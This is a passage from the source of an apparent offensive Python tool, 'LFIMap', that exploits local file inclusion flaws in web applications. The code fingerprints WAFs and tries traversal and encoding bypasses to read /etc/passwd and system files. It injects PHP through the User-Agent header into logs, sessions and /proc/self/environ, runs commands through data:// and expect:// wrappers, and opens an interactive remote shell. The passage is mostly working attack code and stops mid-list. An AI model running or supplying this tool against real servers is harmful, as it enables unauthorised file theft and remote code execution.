            "ModSecurity": ["server: mod_security", "mod_security_waf_enabled"],
            "Akamai": ["x-akamai-transformed"],
            "Barracuda": ["x-barracuda-log-id"],
            "F5 BIG-IP ASM": ["x-forwarded-for-original"], # Often seen with F5
            "Wordfence": ["x-wordfence-cache"],
            "Imperva SecureSphere": ["x-iinfo"],
            "AWS WAF": ["x-aws-waf-rule"], # Less direct, often in conjunction with CloudFront
        }

        detected_wafs = []
        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                if ":" in sig: # Header signature
                    header_name, header_value = sig.split(":", 1)
                    if header_name.lower() in response.headers and header_value.lower() in response.headers[header_name.lower()].lower():
                        detected_wafs.append(waf_name)
                        break
                else: # Content/server string signature
                    if sig.lower() in response.text.lower() or (response.headers.get('Server', '').lower() and sig.lower() in response.headers.get('Server', '').lower()):
                        detected_wafs.append(waf_name)
                        break
        
        if detected_wafs:
            print_warning(f"WAF Detection: Likely protected by: [red]{', '.join(set(detected_wafs))}[/]")
        else:
            if self.args.verbose:
                print_debug("WAF Detection: No common WAF signatures detected.")


    def run_basic_lfi(self):
        """
        Performs a basic LFI scan using common file paths.
        Can optionally use a provided wordlist and directory traversal variations.
        """
        print_info("Starting Basic LFI Scan...")
        
        paths_to_test = []
        if self.args.os == "unix":
            paths_to_test.extend(COMMON_PATHS_UNIX)
            print_info("Target OS set to [yellow]Unix[/]. Using Unix-specific paths.")
        elif self.args.os == "windows":
            paths_to_test.extend(COMMON_PATHS_WINDOWS)
            print_info("Target OS set to [yellow]Windows[/]. Using Windows-specific paths.")
        elif self.args.os == "osx/macos":
            paths_to_test.extend(COMMON_PATHS_MACOS)
            print_info("Target OS set to [yellow]macOS[/]. Using macOS-specific paths.")
        else: # Default or 'all'
            print_info("No specific OS targeted or 'all' selected. Testing common paths for all OS types.")
            paths_to_test.extend(COMMON_PATHS_UNIX)
            paths_to_test.extend(COMMON_PATHS_WINDOWS)
            paths_to_test.extend(COMMON_PATHS_MACOS)
            paths_to_test = list(set(paths_to_test)) # Remove duplicates

        # Add directory traversal variations if requested
        # Also integrate path-normalization and dotdot-trick here for path generation
        if self.args.directory_traversal_variations or (self.args.plugin and ("path-normalization" in self.args.plugin or "dotdot-trick" in self.args.plugin)):
            new_paths = []
            for path in paths_to_test:
                new_paths.append(path) # Original
                new_paths.append(path.replace("../", "..%2f")) # URL encoded slash
                new_paths.append(path.replace("../", "..%c0%af")) # UTF-8 /
                new_paths.append(path.replace("../", "....//")) # Double dots and slashes
                new_paths.append(path.replace("/", "/./")) # /./ normalization bypass
                new_paths.append(path.replace("../", "/.././../")) # /.././../ normalization bypass
                # Additional dotdot-trick variations
                new_paths.append(path.replace("../", "/....//"))
                new_paths.append(path.replace("../", "/..%2e%2e%2f/"))
            paths_to_test = list(set(new_paths)) # Remove duplicates

        # Add case variations if requested
        if self.args.plugin and "case-variation" in self.args.plugin:
            case_varied_paths = []
            for path in paths_to_test:
                case_varied_paths.append(path) # Original
                # Simple case variation for /etc/passwd and C:/Windows/win.ini
                if "/etc/passwd" in path:
                    case_varied_paths.append(path.replace("/etc/passwd", "/EtC/PaSsWd"))
                    case_varied_paths.append(path.replace("/etc/passwd", "/eTc/pAsSwD"))
                if "windows/win.ini" in path.lower():
                    case_varied_paths.append(path.replace("windows/win.ini", "WINDOWS/WIN.INI"))
                    case_varied_paths.append(path.replace("windows/win.ini", "wInDoWs/wIn.iNi"))
            paths_to_test = list(set(case_varied_paths))


        # Load paths from wordlist if provided
        if self.args.wordlist:
            try:
                with open(self.args.wordlist, 'r') as f:
                    wordlist_paths = [line.strip() for line in f if line.strip()]
                paths_to_test.extend(wordlist_paths)
                print_info(f"Loaded {len(wordlist_paths)} paths from wordlist: [yellow]{self.args.wordlist}[/]")
            except FileNotFoundError:
                print_error(f"Wordlist file not found: {self.args.wordlist}")
                return

        for path in paths_to_test:
            found, content = self.test_lfi_payload(path, method=self.args.method_type, data=self.args.post_data)
            if found:
                if self.args.output:
                    with open(self.args.output, 'a') as f:
                        f.write(f"--- Basic LFI Found: {path} ---\n")
                        f.write(content + "\n\n")
                if not self.args.all: # Stop after first success if --all is not set
                    print_info("Stopping basic LFI scan after first hit (use --all to continue).")
                    return

    def run_file_wrapper(self):
        """
        Attempts LFI using the file:/// wrapper.
        """
        print_info("Starting File Wrapper (file:///) Scan...")
        
        # Common files to test with file:///
        files_to_test = []
        if self.args.os == "unix":
            files_to_test.extend(COMMON_PATHS_UNIX)
            print_info("Target OS set to [yellow]Unix[/]. Using Unix-specific file paths.")
        elif self.args.os == "windows":
            files_to_test.extend(COMMON_PATHS_WINDOWS)
            print_info("Target OS set to [yellow]Windows[/]. Using Windows-specific file paths.")
        elif self.args.os == "osx/macos":
            files_to_test.extend(COMMON_PATHS_MACOS)
            print_info("Target OS set to [yellow]macOS[/]. Using macOS-specific file paths.")
        else: # Default or 'all'
            print_info("No specific OS targeted or 'all' selected. Testing common paths for all OS types.")
            files_to_test.extend(COMMON_PATHS_UNIX)
            files_to_test.extend(COMMON_PATHS_WINDOWS)
            files_to_test.extend(COMMON_PATHS_MACOS)
            files_to_test = list(set(files_to_test)) # Remove duplicates

        for file_path in files_to_test:
            # The file:// wrapper requires an absolute path, so we remove the ../../
            # This needs to be handled carefully, as the original paths are relative.
            # For simplicity, we'll assume the common paths are relative to a web root
            # and try to convert them to absolute paths for file://.
            # This is a heuristic and might not always work.
            
            # Attempt to convert relative path to a plausible absolute path for file:///
            # This is a very rough heuristic.
            absolute_path_guess = file_path.replace("../", "/").lstrip("/")
            if self.args.os == "windows":
                # For Windows, assume C: drive for common paths
                if not absolute_path_guess.startswith("C:"):
                    absolute_path_guess = "C:/" + absolute_path_guess
                # Replace any remaining backslashes if not already handled by plugin
                absolute_path_guess = absolute_path_guess.replace("\\", "/")
            
            payload = f"file:///{absolute_path_guess}"
            print_info(f"Testing file:/// payload: [yellow]{payload}[/]")
            response = self._make_request(payload, method=self.args.method_type, data=self.args.post_data)
            
            if response and response.status_code == 200:
                found, indicator_type = self._check_lfi_indicators(response.text)
                if found:
                    print_success(f"File Wrapper LFI confirmed with payload: [green]{payload}[/] (Content Found)")
                    print_info("Content snippet (first 500 characters):")
                    console.print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                    if self.args.output:
                        with open(self.args.output, 'a') as out_f:
                            out_f.write(f"--- File Wrapper LFI: {payload} ---\n")
                            out_f.write(content + "\n\n")
                    if not self.args.all:
                        print_info("Stopping File Wrapper scan after first hit (use --all to continue).")
                        return
                else:
                    print_warning(f"File Wrapper payload {payload} returned 200 OK, but no common LFI indicators found.")
                    if self.args.verbose:
                        print_info("Full response content (verbose):")
                        console.print(response.text)
            elif response:
                print_warning(f"File Wrapper payload {payload} returned status code: {response.status_code}")
        
        print_info("File Wrapper scan finished.")

    def run_php_filter(self):
        """
        Attempts LFI using PHP filters (e.g., base64 encoding).
        """
        print_info("Starting PHP Filter Scan...")
        target_file = self.args.php_filter_file or "index.php" # Default file to read
        filters = [
            "php://filter/convert.base64-encode/resource=",
            "php://filter/string.strip_tags|convert.base64-encode/resource=",
            "php://filter/zlib.deflate|convert.base64-encode/resource=",
        ]
        if self.args.php_filter_custom:
            filters.append(self.args.php_filter_custom + "/resource=")

        for f in filters:
            payload = f + target_file
            print_info(f"Testing PHP filter payload: [yellow]{payload}[/]")
            response = self._make_request(payload, method=self.args.method_type, data=self.args.post_data)
            if response and response.status_code == 200:
                try:
                    # Attempt to decode base64 content
                    decoded_content = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                    # Check for LFI indicators in decoded content
                    found, indicator_type = self._check_lfi_indicators(decoded_content)
                    if found:
                        print_success(f"PHP Filter LFI successful for {target_file} with filter {f.split('/')[2]}:")
                        print_info("Decoded content snippet (first 500 characters):")
                        console.print(decoded_content[:500] + "..." if len(decoded_content) > 500 else decoded_content)
                        if self.args.output:
                            with open(self.args.output, 'a') as out_f:
                                out_f.write(f"--- PHP Filter LFI: {target_file} with {f.split('/')[2]} ---\n")
                                out_f.write(decoded_content + "\n\n")
                        if not self.args.all:
                            print_info("Stopping PHP filter scan after first hit (use --all to continue).")
                            return
                    else:
                        print_warning(f"PHP Filter payload {payload} returned 200 OK, decoded, but no LFI indicators found.")
                        if self.args.verbose:
                            print_info("Decoded content (verbose):")
                            console.print(decoded_content)
                except Exception as e:
                    print_warning(f"Failed to decode base64 for {payload}: {e}. Response might not be base64 encoded or malformed.")
                    if self.args.verbose:
                        print_info("Raw response (verbose):")
                        console.print(response.text)
            elif response:
                print_warning(f"PHP Filter payload {payload} returned status code: {response.status_code}")

    def _interactive_shell(self, lfi_path, cmd_param):
        """
        Provides an interactive shell after successful command execution.
        """
        print_success(f"\nInteractive Shell initiated for: [green]{lfi_path}[/]")
        print_info(f"Use '[yellow]{cmd_param}[/]' parameter for command injection.")
        print_info(f"Type '[yellow]exit[/]' or '[yellow]quit[/]' to leave the shell.")

        while True:
            try:
                command = console.input(f"[cyan]LFIMap Shell > [/]").strip()
                if command.lower() in ["exit", "quit"]:
                    print_info("Exiting interactive shell.")
                    break
                if not command:
                    continue

                # Construct command execution payload
                # Use the original URL template and replace FUZZ with lfi_path
                # Then append the command parameter
                full_url_with_cmd = self.url.replace("FUZZ", lfi_path)
                
                # Check if cmd_param already exists in the URL, if so, append with &
                if "?" in full_url_with_cmd and not full_url_with_cmd.endswith("?"):
                    full_url_with_cmd += f"&{cmd_param}={quote(command)}"
                else:
                    full_url_with_cmd += f"?{cmd_param}={quote(command)}"

                print_info(f"Executing: [yellow]{command}[/]")
                
                # For shell, we always use GET method for command execution, as it's typically in URL
                # unless the user explicitly specified POST for the vulnerable parameter.
                # Let's use GET for the command execution part, regardless of initial method_type.
                shell_response = self.session.get(
                    full_url_with_cmd,
                    timeout=self.args.timeout,
                    verify=not self.args.no_ssl_verify,
                    headers=self.session.headers,
                    allow_redirects=not self.args.ignore_redirects # Apply ignore_redirects
                )

                if shell_response and shell_response.status_code == 200:
                    console.print(f"[white]{shell_response.text}[/]")
                    if self.args.output:
                        with open(self.args.output, 'a') as f:
                            f.write(f"--- Shell Command: {command} ---\n")
                            f.write(shell_response.text + "\n\n")
                else:
                    print_error(f"Command execution failed. Status: {shell_response.status_code if shell_response else 'N/A'}")
            except KeyboardInterrupt:
                print_info("\nExiting interactive shell.")
                break
            except Exception as e:
                print_error(f"An error occurred in shell: {e}")

    def run_log_poisoning(self):
        """
        Performs a log poisoning attack by injecting PHP code into a log file
        via the User-Agent, then including the log file via LFI.
        """
        print_info("Starting Log Poisoning Attack...")
        
        log_file = self.args.log_file
        if not log_file:
            if self.args.os == "windows":
                log_file = "../../inetpub/logs/LogFiles/W3SVC1/exYYMMDD.log" # Placeholder, needs dynamic date
                print_info(f"No log file specified. Using default Windows IIS log: [yellow]{log_file}[/]")
                print_warning("Note: IIS log file names contain dates (exYYMMDD.log). You might need to manually adjust or fuzz this path.")
            elif self.args.os == "osx/macos":
                log_file = "/var/log/apache2/access_log"
                print_info(f"No log file specified. Using default macOS Apache log: [yellow]{log_file}[/]")
            else: # Default to Unix
                log_file = "/var/log/apache2/access.log"
                print_info(f"No log file specified. Using default Unix Apache log: [yellow]{log_file}[/]")

        injection_string = self.args.injection_string
        cmd_param = self.args.cmd_param

        print_info(f"Attempting to inject '[yellow]{injection_string}[/]' into {log_file} via User-Agent...")
        
        # Step 1: Inject PHP code into the log file by sending a request with a malicious User-Agent
        # We send this request to the base URL (without FUZZ) as it's just to get the server to log it.
        base_url_for_injection = self.url.replace("?file=FUZZ", "").replace("&file=FUZZ", "").replace("FUZZ", "")
        
        injection_headers = self.session.headers.copy()
        injection_headers['User-Agent'] = injection_string

        try:
            print_info(f"Sending injection request to {base_url_for_injection} with User-Agent: {injection_string}")
            # Use session for auth/proxy
            inject_response = self.session.get( # Use session for auth/proxy
                base_url_for_injection, 
                headers=injection_headers, 
                timeout=self.args.timeout, 
                verify=not self.args.no_ssl_verify,
                allow_redirects=not self.args.ignore_redirects # Apply ignore_redirects
            )
            if inject_response.status_code == 200:
                print_success(f"Injection request sent successfully. Status: {inject_response.status_code}")
            else:
                print_warning(f"Injection request returned non-200 status: {inject_response.status_code}. This might still work if the server logs it.")
            if self.args.verbose:
                print_debug(f"Injection Response Status: {inject_response.status_code}")
                print_debug(f"Injection Response Headers: {inject_response.headers}")
                print_debug(f"Injection Response Content (first 200 chars): {inject_response.text[:200]}")
        except requests.exceptions.RequestException as e:
            print_error(f"Injection request failed: {e}")
            if not self.args.ignore_server_error: # Check the new flag
                sys.exit(1)
            return

        # Step 2: Try to execute the injected code by including the log file via LFI
        print_info(f"Attempting to trigger code execution by including log file: [yellow]{log_file}[/]...")
        
        trigger_response = self._make_request(log_file, method=self.args.method_type, data=self.args.post_data) # This uses the LFI vulnerability
        
        if trigger_response and trigger_response.status_code == 200:
            if injection_string in trigger_response.text:
                print_success(f"Log poisoning LFI confirmed! Injected code found in response.")
                print_info(f"You can now try to execute commands. Example: [yellow]{self.url.replace('FUZZ', log_file)}&{cmd_param}=id[/]")
                
                if self.args.command:
                    print_info(f"Attempting to execute command: '[yellow]{self.args.command}[/]'")
                    command_payload = f"{log_file}&{cmd_param}={requests.utils.quote(self.args.command)}" # URL-encode command
                    command_response = self._make_request(command_payload, method=self.args.method_type, data=self.args.post_data)
                    if command_response and command_response.status_code == 200:
                        print_success(f"Command '{self.args.command}' executed successfully. Output:")
                        console.print(command_response.text)
                        if self.args.output:
                            with open(self.args.output, 'a') as f:
                                f.write(f"--- Log Poisoning Command Output: {self.args.command} ---\n")
                                f.write(command_response.text + "\n\n")
                        # Offer interactive shell
                        self._interactive_shell(log_file, cmd_param)
                    else:
                        print_error(f"Command execution failed. Status: {command_response.status_code if command_response else 'N/A'}")
            else:
                print_warning(f"Log file {log_file} included, but injected string not found in response. Possible WAF or sanitization.")
                if self.args.verbose:
                    print_info("Full response (verbose):")
                    console.print(trigger_response.text)
        elif trigger_response:
            print_error(f"Failed to include log file {log_file}. Status: {trigger_response.status_code}")

    def run_session_poisoning(self):
        """
        Attempts session poisoning by including a PHP session file.
        Note: This tool does not perform the session injection itself;
        the user is assumed to have already injected code into a session.
        """
        print_info("Starting Session Poisoning Attack...")
        
        session_ids_to_try = []
        if self.args.session_id:
            session_ids_to_try.append(self.args.session_id)
        elif self.args.plugin and "session-id-bruteforce" in self.args.plugin:
            print_info("Session ID Bruteforce plugin enabled. Generating common session IDs...")
            # Generate common session IDs (e.g., alphanumeric, specific lengths)
            # This is a very basic bruteforce. A real one would be more sophisticated.
            chars = "0123456789abcdef"
            for length in [26, 32]: # Common PHP session ID lengths
                for _ in range(100): # Try 100 random IDs for each length
                    session_ids_to_try.append(''.join(random.choice(chars) for i in range(length)))
            print_info(f"Generated {len(session_ids_to_try)} session IDs for bruteforcing.")
        else:
            print_error("Session ID (--session-id) is required for session poisoning, or enable --plugin session-id-bruteforce.")
            return

        injection_string = self.args.injection_string
        cmd_param = self.args.cmd_param

        for session_id in session_ids_to_try:
            session_file_paths = []
            if self.args.os == "unix":
                session_file_paths.extend([f"{p}{session_id}" for p in PHP_SESSION_PATHS_UNIX])
            elif self.args.os == "windows":
                session_file_paths.extend([f"{p}{session_id}" for p in PHP_SESSION_PATHS_WINDOWS])
            elif self.args.os == "osx/macos":
                session_file_paths.extend([f"{p}{session_id}" for p in PHP_SESSION_PATHS_MACOS])
            else: # Default or 'all'
                session_file_paths.extend([f"{p}{session_id}" for p in PHP_SESSION_PATHS_UNIX])
                session_file_paths.extend([f"{p}{session_id}" for p in PHP_SESSION_PATHS_WINDOWS])
                session_file_paths.extend([f"{p}{session_id}" for p in PHP_SESSION_PATHS_MACOS])
                session_file_paths = list(set(session_file_paths)) # Remove duplicates

            print_info(f"Attempting to include session file for ID: [yellow]{session_id}[/]...")
            print_warning("Note: This tool assumes PHP code has already been injected into the session.")
            
            found_session = False
            for session_path in session_file_paths:
                print_info(f"Trying session path: [yellow]{session_path}[/]")
                trigger_response = self._make_request(session_path, method=self.args.method_type, data=self.args.post_data)
                
                if trigger_response and trigger_response.status_code == 200:
                    if injection_string in trigger_response.text:
                        print_success(f"Session poisoning LFI confirmed! Injected code found in response for {session_path}.")
                        print_info(f"You can now try to execute commands. Example: [yellow]{self.url.replace('FUZZ', session_path)}&{cmd_param}=id[/]")
                        found_session = True
                        
                        if self.args.command:
                            print_info(f"Attempting to execute command: '[yellow]{self.args.command}[/]'")
                            command_payload = f"{session_path}&{cmd_param}={requests.utils.quote(self.args.command)}" # URL-encode command
                            command_response = self._make_request(command_payload, method=self.args.method_type, data=self.args.post_data)
                            if command_response and command_response.status_code == 200:
                                print_success(f"Command '{self.args.command}' executed successfully. Output:")
                                console.print(command_response.text)
                                if self.args.output:
                                    with open(self.args.output, 'a') as f:
                                        f.write(f"--- Session Poisoning Command Output: {self.args.command} ---\n")
                                        f.write(command_response.text + "\n\n")
                                # Offer interactive shell
                                self._interactive_shell(session_path, cmd_param)
                            else:
                                print_error(f"Command execution failed. Status: {command_response.status_code if command_response else 'N/A'}")
                        if not self.args.all:
                            print_info("Stopping session poisoning scan after first hit (use --all to continue).")
                            return
                    else:
                        print_warning(f"Session file {session_path} included, but injected string not found in response. Possible WAF or sanitization.")
                        if self.args.verbose:
                            print_info("Full response (verbose):")
                            console.print(trigger_response.text)
                elif trigger_response:
                    print_warning(f"Failed to include session file {session_path}. Status: {trigger_response.status_code}")
            
            if found_session and not self.args.all:
                break # Stop if found and not --all

        if not found_session:
            print_error("No session file found or injected code not detected in any common session paths.")

    def run_proc_self_environ(self):
        """
        Exploits LFI via /proc/self/environ by injecting PHP code into the User-Agent
        and then including the /proc/self/environ file.
        """
        print_info("Starting /proc/self/environ LFI Attack...")
        payload = "../../../../proc/self/environ"
        injection_string = self.args.injection_string
        cmd_param = self.args.cmd_param

        if self.args.os == "windows":
            print_warning("/proc/self/environ is a Unix-like specific path. This method is unlikely to work on Windows.")
            if not self.args.ignore_server_error: # Check the new flag
                return # Skip if not ignoring errors on incompatible OS

        print_info(f"Attempting to inject '[yellow]{injection_string}[/]' into User-Agent for {payload}...")
        
        # Step 1: Inject PHP code into the environment by sending a request with a malicious User-Agent
        # We send this request to the base URL (without FUZZ) as it's just to get the server to log it.
        base_url_for_injection = self.url.replace("?file=FUZZ", "").replace("&file=FUZZ", "").replace("FUZZ", "")

        injection_headers = self.session.headers.copy()
        injection_headers['User-Agent'] = injection_string

        try:
            print_info(f"Sending injection request to {base_url_for_injection} with User-Agent: {injection_string}")
            # Use session for auth/proxy
            inject_response = self.session.get(
                base_url_for_injection, 
                headers=injection_headers, 
                timeout=self.args.timeout, 
                verify=not self.args.no_ssl_verify,
                allow_redirects=not self.args.ignore_redirects # Apply ignore_redirects
            )
            if inject_response.status_code == 200:
                print_success(f"Injection request sent successfully. Status: {inject_response.status_code}")
            else:
                print_warning(f"Injection request returned non-200 status: {inject_response.status_code}. This might still work if the process is reused.")
            if self.args.verbose:
                print_debug(f"Injection Response Status: {inject_response.status_code}")
                print_debug(f"Injection Response Headers: {inject_response.headers}")
                print_debug(f"Injection Response Content (first 200 chars): {inject_response.text[:200]}")
        except requests.exceptions.RequestException as e:
            print_error(f"Injection request failed: {e}")
            if not self.args.ignore_server_error: # Check the new flag
                sys.exit(1)
            return

        # Step 2: Now, try to include /proc/self/environ via LFI
        print_info(f"Attempting to include [yellow]{payload}[/] to trigger code execution...")
        trigger_response = self._make_request(payload, method=self.args.method_type, data=self.args.post_data)
        
        if trigger_response and trigger_response.status_code == 200:
            if injection_string in trigger_response.text:
                print_success(f"/proc/self/environ LFI confirmed! Injected code found in response.")
                print_info(f"You can now try to execute commands. Example: [yellow]{self.url.replace('FUZZ', payload)}&{cmd_param}=id[/]")
                
                if self.args.command:
                    print_info(f"Attempting to execute command: '[yellow]{self.args.command}[/]'")
                    command_payload = f"{payload}&{cmd_param}={requests.utils.quote(self.args.command)}" # URL-encode command
                    command_response = self._make_request(command_payload, method=self.args.method_type, data=self.args.post_data)
                    if command_response and command_response.status_code == 200:
                        print_success(f"Command '{self.args.command}' executed successfully. Output:")
                        console.print(command_response.text)
                        if self.args.output:
                            with open(self.args.output, 'a') as f:
                                f.write(f"--- /proc/self/environ Command Output: {self.args.command} ---\n")
                                f.write(command_response.text + "\n\n")
                        # Offer interactive shell
                        self._interactive_shell(payload, cmd_param)
                    else:
                        print_error(f"Command execution failed. Status: {command_response.status_code if command_response else 'N/A'}")
            else:
                print_warning(f"{payload} included, but injected string not found in response. This method relies on the server process reusing the environment. It might not work if the process forks or environment is sanitized.")
                if self.args.verbose:
                    print_info("Full response (verbose):")
                    console.print(trigger_response.text)
        elif trigger_response:
            print_error(f"Failed to include {payload}. Status: {trigger_response.status_code}")

    def run_data_uri(self):
        """
        Attempts LFI using the data:// URI scheme to embed and execute PHP code.
        Requires `allow_url_include` to be enabled on the target server.
        """
        print_info("Starting Data URI LFI Attack...")
        injection_string = self.args.injection_string
        cmd_param = self.args.cmd_param

        # Base64 encode the injection string for the data URI
        encoded_injection = base64.b64encode(injection_string.encode()).decode()
        payload = f"data://text/plain;base64,{encoded_injection}"

        print_info(f"Testing Data URI payload: [yellow]{payload}[/]")
        response = self._make_request(payload, method=self.args.method_type, data=self.args.post_data)
        
        if response and response.status_code == 200:
            # Look for signs of the code being processed or executed
            if "system" in response.text or "php" in response.text or "eval" in response.text:
                print_success(f"Data URI LFI successful! Injected code appears to be processed.")
                print_info(f"You can now try to execute commands. Example: [yellow]{self.url.replace('FUZZ', requests.utils.quote(payload))}&{cmd_param}=id[/]")
                
                if self.args.command:
                    print_info(f"Attempting to execute command: '[yellow]{self.args.command}[/]'")
                    # Ensure the data URI payload itself is URL-encoded when used with a command
                    command_payload = f"{requests.utils.quote(payload)}&{cmd_param}={requests.utils.quote(self.args.command)}"
                    command_response = self._make_request(command_payload, method=self.args.method_type, data=self.args.post_data)
                    if command_response and command_response.status_code == 200:
                        print_success(f"Command '{self.args.command}' executed successfully. Output:")
                        console.print(command_response.text)
                        if self.args.output:
                            with open(self.args.output, 'a') as f:
                                f.write(f"--- Data URI Command Output: {self.args.command} ---\n")
                                f.write(command_response.text + "\n\n")
                        # Offer interactive shell
                        self._interactive_shell(requests.utils.quote(payload), cmd_param)
                    else:
                        print_error(f"Command execution failed. Status: {command_response.status_code if command_response else 'N/A'}")
            else:
                print_warning(f"Data URI payload returned 200 OK, but injected code not found or not executed in response. 'allow_url_include' might be disabled.")
                if self.args.verbose:
                    print_info("Full response (verbose):")
                    console.print(response.text)
        elif response:
            print_warning(f"Data URI payload returned status code: {response.status_code}")
        else:
            print_error("Data URI request failed or returned no response.")

    def run_timing_lfi(self):
        """
        Performs blind LFI using timing-based detection.
        Injects a payload that causes a delay and measures response time.
        """
        print_info("Starting Timing-Based Blind LFI Scan...")
        
        # Payload that causes a delay (e.g., PHP sleep)
        # Note: This requires the target to interpret PHP.
        # Other languages might require different delay functions.
        delay_seconds = self.args.expected_delay
        if not delay_seconds:
            print_error("Expected delay (--expected-delay) is required for timing-based LFI.")
            return

        # Baseline request (no delay)
        print_info("Establishing baseline response time...")
        baseline_payload = "index.php" # A non-malicious, existing file
        baseline_response = self._make_request(baseline_payload, method=self.args.method_type, data=self.args.post_data)
        if not baseline_response:
            print_error("Could not establish baseline response time. Exiting timing LFI.")
            return
        baseline_time = baseline_response.elapsed_time
        print_info(f"Baseline response time: {baseline_time:.2f} seconds.")

        # PHP sleep payload
        # This payload assumes PHP execution. For other languages, this needs to change.
        # The 'FUZZ' is replaced by this entire string.
        php_sleep_payload = f"<?php sleep({delay_seconds}); ?>"
        
        # Encode for data URI or other methods that might be used
        encoded_php_sleep = base64.b64encode(php_sleep_payload.encode()).decode()
        
        # Common files/paths to test with timing-based LFI
        # These are paths where PHP code might be executed if included
        timing_test_paths = [
            "php://filter/read=string.strip_tags|convert.base64-decode/resource=data://text/plain;base64," + encoded_php_sleep,
            "data://text/plain;base64," + encoded_php_sleep, # Direct data URI inclusion
            # Other paths where code execution might be possible if injected
            # (e.g., log files, session files, /proc/self/environ if injection works)
            # For these, the injection needs to happen first.
            # This example focuses on direct inclusion of the sleep payload.
        ]

        print_info(f"Testing for timing-based LFI with an expected delay of {delay_seconds} seconds...")
        
        found_timing_lfi = False
        for path in timing_test_paths:
            print_info(f"Testing timing payload: [yellow]{path}[/]")
            response = self._make_request(path, method=self.args.method_type, data=self.args.post_data)
            
            if response and hasattr(response, 'elapsed_time'):
                response_time = response.elapsed_time
                print_info(f"Response time for {path}: {response_time:.2f} seconds.")
                
                # Check if response time is significantly higher than baseline + expected delay
                # Allow for some variance, e.g., 80% of expected delay
                if response_time >= (baseline_time + delay_seconds * 0.8):
                    print_success(f"Timing-based LFI likely confirmed with payload: [green]{path}[/]")
                    print_info(f"Observed delay: {response_time - baseline_time:.2f} seconds (expected at least {delay_seconds * 0.8:.2f} seconds).")
                    found_timing_lfi = True
                    if self.args.output:
                        with open(self.args.output, 'a') as f:
                            f.write(f"--- Timing-Based LFI Found: {path} ---\n")
                            f.write(f"Observed response time: {response_time:.2f}s (Baseline: {baseline_time:.2f}s)\n\n")
                    if not self.args.all:
                        print_info("Stopping timing LFI scan after first hit (use --all to continue).")
                        return
                else:
                    print_warning(f"Payload {path} did not cause expected delay.")
            else:
                print_warning(f"No response or elapsed time for timing payload: {path}")
        
        if not found_timing_lfi:
            print_error("No timing-based LFI found with tested payloads.")

    def run_exec_wrapper(self):
        """
        Attempts LFI using PHP expect:// wrapper for command execution.
        Requires 'expect' extension enabled in php.ini.
        """
        print_info("Starting PHP Expect Wrapper LFI Attack...")
        
        # The expect:// wrapper directly executes commands.
        # The payload will be expect://<command>
        # This method directly attempts command execution.
        
        # Check if OS is Windows, as expect:// is typically Unix-like PHP.
        if self.args.os == "windows":
            print_warning("PHP expect:// wrapper is typically for Unix-like systems. This method might not work on Windows.")
            # Continue anyway, but warn.

        # Initial test payload to see if expect:// is enabled and working
        test_command = "id" if self.args.os != "windows" else "whoami"
        initial_payload = f"expect://{test_command}"

        print_info(f"Testing initial expect:// payload: [yellow]{initial_payload}[/]")
        response = self._make_request(initial_payload, method=self.args.method_type, data=self.args.post_data)

        if response and response.status_code == 200:
            # Look for command output indicators
            if test_command in response.text or "uid=" in response.text or "nt authority" in response.text.lower():
                print_success(f"PHP Expect Wrapper LFI likely successful! Initial command '{test_command}' output detected.")
                print_info("Output snippet (first 500 characters):")
                console.print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                
                # Offer interactive shell
                self._interactive_shell(initial_payload, self.args.cmd_param) # Pass the full expect:// payload
            else:
                print_warning(f"PHP Expect Wrapper payload returned 200 OK, but no command output indicators found. 'expect' extension might be disabled or output is filtered.")
                if self.args.verbose:
                    print_info("Full response (verbose):")
                    console.print(response.text)
        elif response:
            print_warning(f"PHP Expect Wrapper payload returned status code: {response.status_code}")
        else:
            print_error("PHP Expect Wrapper request failed or returned no response.")

    def run_wrapper_phar(self):
        """
        Attempts LFI using the phar:// wrapper for deserialization attacks.
        Requires a vulnerable PHP application handling phar archives.
        """
        print_info("Starting PHAR Wrapper (phar://) Scan...")
        
        # This method typically requires a specially crafted PHAR file to be uploaded
        # and then included via LFI. LFIMap will test for the *vulnerability* of including
        # a phar file, but it does not generate or upload the malicious phar file itself.
        # For demonstration, we'll try to include a non-existent phar file to see if
        # a PHP warning/error related to phar deserialization occurs.

        # A common technique is to point to a local file that might be a phar file
        # or to a non-existent one to trigger errors.
        # Example: phar:///path/to/archive.phar/file.txt
        # Or just phar://./archive.phar
        
        # We'll use a dummy phar file name for testing.
        dummy_phar_file = "dummy.phar"
        
        # Common paths where a phar might be expected or uploaded
        paths_to_test = [
            f"phar://{dummy_phar_file}/test.txt",
            f"phar://{dummy_phar_file}", # Try including the archive itself
            f"phar:///tmp/{dummy_phar_file}/test.txt", # Common temp dir
            f"phar:///var/www/html/{dummy_phar_file}/test.txt", # Common web root
        ]

        print_info(f"Testing PHAR wrapper payloads. Note: This assumes a PHAR file exists or can be uploaded.")

        for payload in paths_to_test:
            print_info(f"Testing PHAR wrapper payload: [yellow]{payload}[/]")
            response = self._make_request(payload, method=self.args.method_type, data=self.args.post_data)

            if response and response.status_code == 200:
                # Look for indicators of PHAR processing or deserialization errors
                if "phar error" in response.text.lower() or "deserialization" in response.text.lower() or "signature verification failed" in response.text.lower():
                    print_success(f"PHAR Wrapper LFI likely successful! PHAR-related error/content detected with payload: [green]{payload}[/]")
                    print_info("Response snippet (first 500 characters):")
                    console.print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                    if self.args.output:
                        with open(self.args.output, 'a') as out_f:
                            out_f.write(f"--- PHAR Wrapper LFI: {payload} ---\n")
                            out_f.write(response.text + "\n\n")
                    if not self.args.all:
                        print_info("Stopping PHAR Wrapper scan after first hit (use --all to continue).")
                        return
                else:
                    print_warning(f"PHAR Wrapper payload {payload} returned 200 OK, but no PHAR-related indicators found.")
                    if self.args.verbose:
                        print_info("Full response content (verbose):")
                        console.print(response.text)
            elif response:
                print_warning(f"PHAR Wrapper payload {payload} returned status code: {response.status_code}")
        
        print_info("PHAR Wrapper scan finished.")

    def run_wrapper_zip(self):
        """
        Attempts LFI using the zip:// wrapper to read files inside zip archives.
        Requires a zip file to be present and accessible.
        """
        print_info("Starting ZIP Wrapper (zip://) Scan...")
        
        # Similar to PHAR, this requires a zip file to be present.
        # We'll test for common zip file names and paths.
        # Example: zip:///path/to/archive.zip#file.txt
        
        dummy_zip_file = "archive.zip"
        
        # Common paths where a zip might be expected or uploaded
        paths_to_test = [
            f"zip://{dummy_zip_file}%23file.txt", # %23 is #
            f"zip:///tmp/{dummy_zip_file}%23file.txt",
